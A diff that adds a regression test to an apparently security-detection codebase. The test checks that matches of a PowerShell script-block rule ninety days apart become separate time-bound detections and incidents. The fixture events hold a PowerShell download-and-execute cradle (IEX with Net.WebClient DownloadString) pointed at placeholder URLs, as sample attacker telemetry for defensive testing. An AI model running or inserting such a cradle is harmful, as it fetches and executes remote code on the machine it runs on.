@@ -152,6 +152,41 @@ def test_repeated_filter_rule_hits_grouped_into_one_detection(db_session):
     assert len(json.loads(detections[0].matched_event_ids)) == 3
 
 
+def test_filter_rule_hits_far_apart_create_separate_time_bound_detections(db_session):
+    """Regression test: filter-kind rules used to group every matching event on
+    a host into one detection regardless of how far apart they occurred, which
+    could span a detection (and the incident built from it) across months.
+    Hits more than FILTER_RULE_WINDOW_MINUTES apart must split into separate
+    detections instead."""
+    db_session.add(
+        _event(
+            4104,
+            minutes=0,
+            channel="Microsoft-Windows-PowerShell/Operational",
+            command_line="IEX (New-Object Net.WebClient).DownloadString('http://x')",
+        )
+    )
+    db_session.add(
+        _event(
+            4104,
+            minutes=60 * 24 * 90,  # ~90 days later
+            channel="Microsoft-Windows-PowerShell/Operational",
+            command_line="IEX (New-Object Net.WebClient).DownloadString('http://y')",
+        )
+    )
+    db_session.commit()
+
+    run_detection(db_session)
+
+    detections = db_session.query(Detection).filter(Detection.rule_name == "Suspicious PowerShell script block").all()
+    assert len(detections) == 2
+    for d in detections:
+        assert d.last_seen - d.first_seen < timedelta(minutes=30)
+
+    incidents = db_session.query(Incident).all()
+    assert len(incidents) == 2
+
+
 def test_log_cleared_detected(db_session):
     db_session.add(_event(1102, user="attacker"))
     db_session.commit()
